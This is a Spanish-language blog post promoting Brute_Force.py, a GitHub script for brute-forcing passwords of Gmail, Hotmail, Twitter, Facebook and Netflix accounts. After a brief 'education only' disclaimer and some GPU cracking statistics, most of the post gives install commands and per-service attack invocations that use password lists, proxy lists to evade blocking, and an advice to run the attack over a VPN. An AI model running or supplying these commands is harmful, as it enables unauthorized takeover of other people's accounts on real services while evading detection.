---
title: 'Ataques de fuerza bruta a GMAIL, HOTMAIL, TWITTER, FACEBOOK & NETFLIX'
date: 2019-10-07T17:45:00+01:00
draft: false
---

[![](https://1.bp.blogspot.com/-iHhOaEZly7o/XZtrPFEBgZI/AAAAAAAALFw/cWgr3tIjWsMBT0veWe8ndOnh-aQmOEPtgCLcBGAsYHQ/s640/login-1203603_960_720.png)](https://1.bp.blogspot.com/-iHhOaEZly7o/XZtrPFEBgZI/AAAAAAAALFw/cWgr3tIjWsMBT0veWe8ndOnh-aQmOEPtgCLcBGAsYHQ/s1600/login-1203603_960_720.png)

  

**_Esta herramienta ha sido creada con el propósito de concienciar y educar sobre seguridad, no deben ser usadas contra sistemas que no han proporcionado el permiso explicito para probar / atacar. Podrías terminar en la cárcel._**  

  

Los ataques de fuerza bruta son simples y confiables. Los atacantes dejan que una computadora haga el trabajo; por ejemplo, prueban diferentes combinaciones de nombres de usuario y contraseñas, hasta que encuentran una que funciona. Se estima que el 5% de los incidentes confirmados de violación de datos(data breaches) en 2017 se debieron a ataques de fuerza bruta.

  

  

  

ATAQUES DE FUERZA BRUTA POR GPU

La combinación de la CPU y la unidad de procesamiento de gráficos **([GPU](https://es.wikipedia.org/wiki/Unidad_de_procesamiento_gr%C3%A1fico))** acelera la potencia de cómputo al agregar los miles de núcleos de cómputo en la GPU al procesamiento para permitir que el sistema maneje múltiples tareas simultáneamente. El procesamiento de GPU se usa para aplicaciones de análisis, ingeniería y otras aplicaciones de computación intensiva y se puede descifrar contraseñas 250 veces más rápido que una CPU sola.

  

Para ponerlo en perspectiva, una contraseña de seis caracteres que incluye números tiene aproximadamente 2 mil millones de combinaciones posibles. Descifrarlo con una CPU potente que intenta 30 contraseñas por segundo lleva más de dos años. Al agregar una única y potente tarjeta GPU, la misma computadora puede probar 7,100 contraseñas por segundo y descifrar la contraseña en 3.5 días.

  

### Ataques de fuerza bruta por el script Brute\_Force

  

Este script permite realizar una serie de ataques a diferentes servicios como Bacebook, twitter hasta llegar a servicios como Netflix, este script lo podemos encontrar en su repositorio de GitHub desde el siguiente enlace [brute\_force](https://github.com/Matrix07ksa/Brute_Force)

  

[https://github.com/Matrix07ksa/Brute\_Force](https://github.com/Matrix07ksa/Brute_Force)

  

![alt text](https://camo.githubusercontent.com/a08cdabfe91b0b12cac64d869e293477ac44d247/68747470733a2f2f362e746f7034746f702e6e65742f705f3132393239397a3063312e706e67)

_Uso de la aplicación_

  

_![alt text](https://camo.githubusercontent.com/10aaff8f56fe5823698ed677e5b324d8fabcc780/68747470733a2f2f312e746f7034746f702e6e65742f705f31323932357a796b32322e706e67)_

_Ataques con fuerza bruta_

  

#### **Instalador**

```


  
pip install proxylist

  
  

  
pip install mechanize

  

```

  

**Uso**

  

#### **BruteForce Gmail Attack**

```


  
python3 Brute\_Force.py -g Account@gmail.com -l File\_list

  
  

  
python3 Brute\_Force.py -g Account@gmail.com -p Password\_Single

  

```

#### **BruteForce Hotmail Attack**

```


  
python3 Brute\_Force.py -t Account@hotmail.com -l File\_list

  
  

  
python3 Brute\_Force.py -t Account@hotmail.com -p Password\_Single

  

```

#### **BruteForce Twitter Attack**

```


  
python3 Brute\_Force.py -T Account\_Twitter -l File\_list

  

  
python3 Brute\_Force.py -T Account\_Twitter -l File\_list -X proxy-list.txt

  

```

#### **BruteForce Facebook Attack**

```


  
python3 Brute\_Force.py -f Account\_facebook -l File\_list

  

  
python3 Brute\_Force.py -f Account\_facebook -l File\_list -X proxy-list.txt

  

```

  

#### **BruteForce Netflix Attack**

  

  

  
  

```


  
يفضل تشغيل VPN

  
Start On Vpn  

  
python3 Brute\_Force.py -n Account\_Netflix -l File\_list

  

  
python3 Brute\_Force.py -n Account\_Netflix -l File\_list -X proxy-list.txt

  

```

  

  

Fuente: [https://backtrackacademy.com/](https://backtrackacademy.com/articulo/ataques-de-fuerza-bruta-a-gmail-hotmail-twitter-facebook-netflix)

No olvides Compartir... 

  

Siguenos en twitter: [@disoftin](http://twitter.com/disoftin) - [@fredyavila](http://twitter.com/fredyavila)